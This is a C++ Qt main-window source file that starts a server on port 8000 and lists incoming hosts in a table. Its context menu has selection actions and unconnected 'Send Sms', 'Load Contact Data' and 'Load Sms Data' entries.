#include "mainwindow.h"
#include "ui_mainwindow.h"

MainWindow::MainWindow(QWidget *parent) :
    QMainWindow(parent),
    ui(new Ui::MainWindow)
{
    ui->setupUi(this);
    initView();
    mServerManager.moveToThread(&mThread);
    mThread.start();
    mServerManager.start(8000);
}

MainWindow::~MainWindow()
{
    mThread.quit();
    mThread.wait();
    delete ui;
}

void MainWindow::initView()
{
    QObject::connect(&mServerManager, SIGNAL(onIncomeHost(QString,QString,quint16)), &mModel, SLOT(putItem(QString,QString,quint16)));
    ui->tableView->setModel(&mModel);
    ui->tableView->setContextMenuPolicy(Qt::ActionsContextMenu);
    ui->tableView->resizeColumnToContents(0);

    QAction *aAll,*aNone,*aReverse;
    ui->tableView->addAction(aAll = new QAction(QString("Select All"),ui->tableView));
    ui->tableView->addAction(aNone = new QAction(QString("unSelect All"),ui->tableView));
    ui->tableView->addAction(aReverse = new QAction(QString("Reverse Select"),ui->tableView));

    QObject::connect(aAll,SIGNAL(triggered()),&mModel,SLOT(selectAll()));
    QObject::connect(aNone,SIGNAL(triggered()),&mModel,SLOT(unselectAll()));
    QObject::connect(aReverse,SIGNAL(triggered()),&mModel,SLOT(reverseSelect()));

    QAction *separator = new QAction(QString(),ui->tableView);
    separator->setSeparator(true);
    ui->tableView->addAction(separator);


    QAction *aSendSms,*aLoadContact,*aLoadSms;
    ui->tableView->addAction(aSendSms = new QAction(QString("Send Sms"),ui->tableView));
    ui->tableView->addAction(aLoadContact = new QAction(QString("Load Contact Data"),ui->tableView));
    ui->tableView->addAction(aLoadSms = new QAction(QString("Load Sms Data"),ui->tableView));

}
